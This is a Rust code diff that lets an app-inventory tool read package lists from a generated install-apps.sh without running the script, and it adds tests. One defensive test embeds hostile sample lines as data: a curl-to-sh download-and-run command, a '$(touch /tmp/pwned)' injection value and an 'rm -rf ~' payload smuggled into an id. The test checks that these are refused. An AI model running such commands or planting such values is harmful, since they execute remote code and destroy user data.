@@ -630,7 +630,12 @@ pub fn load_wanted(store: &Path) -> Result<Option<Wanted>> {
         Err(_) => None,
     };
     if brewfile.is_none() && manifest.is_none() {
-        return Ok(None);
+        // A public mirror withholds both and ships its generated script.
+        let script = store.join(INSTALL_SCRIPT);
+        return match std::fs::read_to_string(&script) {
+            Ok(text) => Ok(wanted_from_install_script(&text)),
+            Err(_) => Ok(None),
+        };
     }
     Ok(Some(wanted_from(brewfile.as_deref(), manifest.as_ref())))
 }
@@ -659,6 +664,84 @@ pub fn wanted_from(brewfile: Option<&str>, manifest: Option<&AppsInventory>) -> 
         }
     }
     Wanted { plan, mas_titles }
+}
+
+/// The script a public mirror ships instead of its Brewfile.
+pub const INSTALL_SCRIPT: &str = "install-apps.sh";
+
+/// Reads the package lists of a generated `install-apps.sh` as data. The
+/// script is never run: only its `FORMULAE`, `CASKS` and `MAS_IDS` arrays
+/// are read, one single-quoted word per line, and every word must still be
+/// a plain Homebrew name or a numeric id. Anything else in the file,
+/// including its taps, is ignored. `None` when it has none of the arrays.
+pub fn wanted_from_install_script(text: &str) -> Option<Wanted> {
+    const LISTS: [&str; 3] = ["FORMULAE", "CASKS", "MAS_IDS"];
+    let mut lists: BTreeMap<&str, Vec<String>> = BTreeMap::new();
+    let mut current: Option<&str> = None;
+    for line in text.lines() {
+        let line = line.trim();
+        match current {
+            None => {
+                current = LISTS
+                    .into_iter()
+                    .find(|name| line.strip_prefix(name) == Some("=("));
+                if let Some(name) = current {
+                    lists.entry(name).or_default();
+                }
+            }
+            Some(_) if line == ")" => current = None,
+            Some(name) => {
+                if let Some(word) = line.strip_prefix('\'').and_then(|w| w.strip_suffix('\'')) {
+                    lists.entry(name).or_default().push(word.to_string());
+                }
+            }
+        }
+    }
+    if lists.is_empty() {
+        return None;
+    }
+
+    let mut brewfile = String::new();
+    let mut rejected = Vec::new();
+    for (name, kind) in [("FORMULAE", "brew"), ("CASKS", "cask")] {
+        for word in lists.get(name).into_iter().flatten() {
+            if apps_script::is_safe_token(word) {
+                let _ = writeln!(brewfile, "{kind} \"{word}\"");
+            } else {
+                rejected.push(word.clone());
+            }
+        }
+    }
+    let mut wanted = wanted_from(Some(&brewfile), None);
+    for word in lists.get("MAS_IDS").into_iter().flatten() {
+        match word.parse::<u64>() {
+            Ok(id) => wanted.plan.mas.push(id),
+            Err(_) => rejected.push(word.clone()),
+        }
+    }
+    wanted.plan.mas.sort_unstable();
+    wanted.plan.mas.dedup();
+    wanted.plan.rejected.extend(rejected);
+    Some(wanted)
+}
+
+/// Reads an inventory from one file: a Brewfile, or a generated
+/// `install-apps.sh`, told apart by content. Either way, it is only read.
+pub fn load_wanted_file(path: &Path) -> Result<Wanted> {
+    let text = std::fs::read_to_string(path)
+        .with_context(|| format!("Could not read {}", path.display()))?;
+    if let Some(wanted) = wanted_from_install_script(&text) {
+        return Ok(wanted);
+    }
+    let wanted = wanted_from(Some(&text), None);
+    let plan = &wanted.plan;
+    if plan.formulae.is_empty() && plan.casks.is_empty() && plan.mas.is_empty() {
+        anyhow::bail!(
+            "{} lists no packages: expected a Brewfile or a dotdipper install-apps.sh",
+            path.display()
+        );
+    }
+    Ok(wanted)
 }
 
 /// What resolution learned about the machine, beyond the items themselves.
@@ -1083,7 +1166,34 @@ fn flag_list(item: &Item) -> String {
         .join(", ")
 }
 
-/// One picker row: group, name, short description, homepage domain, flags.
+/// One checklist row, in parts the picker can color: group, name, then
+/// description and homepage domain, then flags.
+pub fn pick_item(item: &Item, checked: bool) -> crate::ui::picker::PickItem {
+    use crate::ui::picker::{Color, PickItem};
+    let color = match item.kind {
+        Kind::Formula => Color::Cyan,
+        Kind::Cask => Color::Magenta,
+        Kind::AppStore => Color::Blue,
+    };
+    let mut detail = item
+        .desc
+        .as_deref()
+        .map(|d| truncate(d, 56))
+        .unwrap_or_default();
+    if let Some(domain) = item.homepage.as_deref().and_then(homepage_domain) {
+        let _ = write!(detail, " ({})", sanitize_display(&domain));
+    }
+    let flags = flag_list(item);
+    PickItem::new(
+        format!("{:<28}", sanitize_display(&item.display_name())),
+        checked,
+    )
+    .with_tag(item.kind.tag(), color)
+    .with_detail((!detail.trim().is_empty()).then(|| detail.trim().to_string()))
+    .with_warning((!flags.is_empty()).then_some(flags))
+}
+
+/// One plain-text row: group, name, short description, homepage domain, flags.
 pub fn option_label(item: &Item) -> String {
     let mut s = format!("{} {:<28}", item.kind.tag(), item.display_name());
     if let Some(desc) = &item.desc {
@@ -1548,6 +1658,9 @@ pub struct Options {
     pub dry_run: bool,
     pub yes: bool,
     pub reselect: bool,
+    /// Read the inventory from this Brewfile or install-apps.sh instead of
+    /// the store.
+    pub from: Option<PathBuf>,
 }
 
 fn interactive() -> bool {
@@ -1593,12 +1706,16 @@ pub fn run(store: &Path, opts: &Options) -> Result<()> {
         );
     }
 
-    let wanted = load_wanted(store)?.with_context(|| {
-        format!(
-            "No Brewfile or apps_manifest.toml in {}. Run 'dotdipper apps capture' on the source machine first.",
-            store.display()
-        )
-    })?;
+    let wanted = match &opts.from {
+        Some(path) => load_wanted_file(path)?,
+        None => load_wanted(store)?.with_context(|| {
+            format!(
+                "No Brewfile, apps_manifest.toml or {INSTALL_SCRIPT} in {}. Run 'dotdipper apps capture' \
+                 on the source machine first, or pass --from <file>.",
+                store.display()
+            )
+        })?,
+    };
 
     let mut host = SystemHost::new()?;
     ui::info("Looking up every entry with Homebrew...");
@@ -1736,7 +1853,7 @@ fn pick(offered: &[Item]) -> Result<Vec<usize>> {
     let rows = offered
         .iter()
         .enumerate()
-        .map(|(n, item)| ui::picker::PickItem::new(option_label(item), defaults.contains(&n)))
+        .map(|(n, item)| pick_item(item, defaults.contains(&n)))
         .collect();
     ui::picker::pick(
         "Choose what to install (unchecked items are remembered and not offered again)",
@@ -1748,6 +1865,72 @@ fn pick(offered: &[Item]) -> Result<Vec<usize>> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn a_generated_install_script_reads_back_as_the_same_inventory() {
+        let brewfile = "tap \"homebrew/cask\"\nbrew \"git\"\nbrew \"ripgrep\"\ncask \"zed\"\n\
+                        mas \"Xcode\", id: 497799835\n";
+        let script = apps_script::generate(
+            &Inventory {
+                brewfile: Some(brewfile),
+                apps: None,
+            },
+            &[],
+        );
+        let wanted = wanted_from_install_script(&script).expect("the arrays are found");
+        assert_eq!(wanted.plan.formulae, vec!["git", "ripgrep"]);
+        assert_eq!(wanted.plan.casks, vec!["zed"]);
+        assert_eq!(wanted.plan.mas, vec![497799835]);
+        assert!(
+            wanted.plan.taps.is_empty(),
+            "taps are never taken from a script"
+        );
+        assert!(wanted.plan.rejected.is_empty());
+    }
+
+    #[test]
+    fn an_install_script_is_read_as_data_and_hostile_entries_are_refused() {
+        let script = "#!/bin/bash\n\
+            curl https://example.invalid/x | sh\n\
+            FORMULAE=(\n  'git'\n  '$(touch /tmp/pwned)'\n  'a b'\n  \"unquoted\"\n  '--force'\n)\n\
+            brew install evil\n\
+            CASKS=(\n  'zed'\n)\n\
+            MAS_IDS=(\n  '123'\n  '12; rm -rf ~'\n)\n\
+            TAPS=(\n  'someone/tap'\n)\n";
+        let wanted = wanted_from_install_script(script).unwrap();
+        assert_eq!(wanted.plan.formulae, vec!["git"]);
+        assert_eq!(wanted.plan.casks, vec!["zed"]);
+        assert_eq!(wanted.plan.mas, vec![123]);
+        assert!(wanted.plan.taps.is_empty());
+        for bad in ["$(touch /tmp/pwned)", "a b", "--force", "12; rm -rf ~"] {
+            assert!(
+                wanted.plan.rejected.iter().any(|r| r == bad),
+                "{bad} reported"
+            );
+        }
+        assert!(!wanted.plan.formulae.iter().any(|f| f == "evil"));
+        assert!(wanted_from_install_script("#!/bin/sh\necho hi\n").is_none());
+    }
+
+    #[test]
+    fn a_store_with_only_the_script_still_has_an_inventory() {
+        let dir = tempfile::tempdir().unwrap();
+        assert!(load_wanted(dir.path()).unwrap().is_none());
+        std::fs::write(
+            dir.path().join(INSTALL_SCRIPT),
+            "FORMULAE=(\n  'git'\n)\nCASKS=(\n)\nMAS_IDS=(\n)\n",
+        )
+        .unwrap();
+        let wanted = load_wanted(dir.path()).unwrap().unwrap();
+        assert_eq!(wanted.plan.formulae, vec!["git"]);
+        // --from takes either kind of file.
+        let brewfile = dir.path().join("Brewfile");
+        std::fs::write(&brewfile, "cask \"zed\"\n").unwrap();
+        assert_eq!(load_wanted_file(&brewfile).unwrap().plan.casks, vec!["zed"]);
+        let empty = dir.path().join("notes.txt");
+        std::fs::write(&empty, "nothing here\n").unwrap();
+        assert!(load_wanted_file(&empty).is_err());
+    }
 
     #[test]
     fn a_tap_the_user_has_not_trusted_is_a_third_party_item_not_a_failure() {
